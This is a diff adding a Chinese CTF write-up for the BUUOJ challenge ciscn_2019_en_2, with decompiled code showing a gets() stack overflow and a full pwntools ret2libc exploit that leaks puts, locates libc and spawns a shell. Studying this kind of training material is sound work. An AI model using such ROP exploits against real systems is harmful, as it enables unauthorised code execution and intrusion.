@@ -198,6 +198,122 @@ write_got：获取write函数的GOT地址，该地址存储了write函数在内�
 
 >然后通过基址加上libc中system和str_bin_sh（字符串/bin/sh的地址）的偏移得到这两个关键地址
 
+## ciscn_2019_en_2
+
+>url链接：[ciscn_2019_en_2
+1](https://buuoj.cn/challenges#ciscn_2019_en_2)
+>知识点：ret2libc
+
+![alt text](image-9.png)
+放进linux中checksec一下，然后放进IDA
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  int v4; // [rsp+Ch] [rbp-4h] BYREF
+
+  init(argc, argv, envp);
+  puts("EEEEEEE                            hh      iii                ");
+  puts("EE      mm mm mmmm    aa aa   cccc hh          nn nnn    eee  ");
+  puts("EEEEE   mmm  mm  mm  aa aaa cc     hhhhhh  iii nnn  nn ee   e ");
+  puts("EE      mmm  mm  mm aa  aaa cc     hh   hh iii nn   nn eeeee  ");
+  puts("EEEEEEE mmm  mm  mm  aaa aa  ccccc hh   hh iii nn   nn  eeeee ");
+  puts("====================================================================");
+  puts("Welcome to this Encryption machine\n");
+  begin();
+  while ( 1 )
+  {
+    while ( 1 )
+    {
+      fflush(0LL);
+      v4 = 0;
+      __isoc99_scanf("%d", &v4);
+      getchar();
+      if ( v4 != 2 )
+        break;
+      puts("I think you can do it by yourself");
+      begin();
+    }
+    if ( v4 == 3 )
+    {
+      puts("Bye!");
+      return 0;
+    }
+    if ( v4 != 1 )
+      break;
+    encrypt();
+    begin();
+  }
+  puts("Something Wrong!");
+  return 0;
+}
+int encrypt()
+{
+  size_t v0; // rbx
+  char s[48]; // [rsp+0h] [rbp-50h] BYREF
+  __int16 v3; // [rsp+30h] [rbp-20h]
+
+  memset(s, 0, sizeof(s));
+  v3 = 0;
+  puts("Input your Plaintext to be encrypted");
+  gets(s);
+  while ( 1 )
+  {
+    v0 = (unsigned int)x;
+    if ( v0 >= strlen(s) )
+      break;
+    if ( s[x] <= 96 || s[x] > 122 )
+    {
+      if ( s[x] <= 64 || s[x] > 90 )
+      {
+        if ( s[x] > 47 && s[x] <= 57 )
+          s[x] ^= 0xCu;
+      }
+      else
+      {
+        s[x] ^= 0xDu;
+      }
+    }
+    else
+    {
+      s[x] ^= 0xEu;
+    }
+    ++x;
+  }
+  puts("Ciphertext");
+  return puts(s);
+}
+```
+很容易发现功能1有溢出点，但encrypt函数内使用strlen函数来作为加密的关键，首位\0的特殊输入即可绕过加密，另外本题并无后门函数，首先需要泄漏libc和对应函数地址，利用泄漏到的信息，二次溢出获得shell
+exp:
+```python
+from pwn import *
+from LibcSearcher import *
+context.log_level='debug'
+
+p=remote('node5.buuoj.cn',25970)
+elf=ELF('./ciscn_2019_en_2')
+
+ret=0x4006b9  #用于栈对对齐
+pop_rdi=0x400c83 #用于设置函数参数
+main=elf.sym['main']  #获取main函数地址用于再次触发漏洞
+puts_plt=elf.plt['puts']  #获得puts函数PLT地址
+puts_got=elf.got['puts']  #获得puts函数GOT地址，用于泄漏libc函数地址
+
+p.sendlineafter("choice!\n",'1')#选择菜单1
+pl=b'\0'+b'a'*(0x50-1+8)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)#b'\0'用于越过strlen的过滤，然后缓冲区+ROP链调用puts（puts_got)打印puts真实地址+返回函数
+p.sendlineafter("encrypted\n",pl)
+p.recvline()
+p.recvline()
+puts=u64(p.recvuntil(b'\n')[:-1].ljust(8,b'\0'))#接收并解析的puts函数地址
+libc=LibcSearcher('puts',puts)#识别libc版本
+libc_addr=puts-libc.dump('puts')#计算libc基址
+binsh=libc_addr+libc.dump('str_bin_sh')#计算system函数地址和/bin/sh字符串地址
+system=libc_addr+libc.dump('system')
+p.sendlineafter("choice!\n",'1')
+pl=b'\0'+b'a'*(0x50-1+8)+p64(ret)+p64(pop_rdi)+p64(binsh)+p64(system)
+p.sendlineafter("encrypted\n",pl)
 
 
+p.interactive()
+```
 
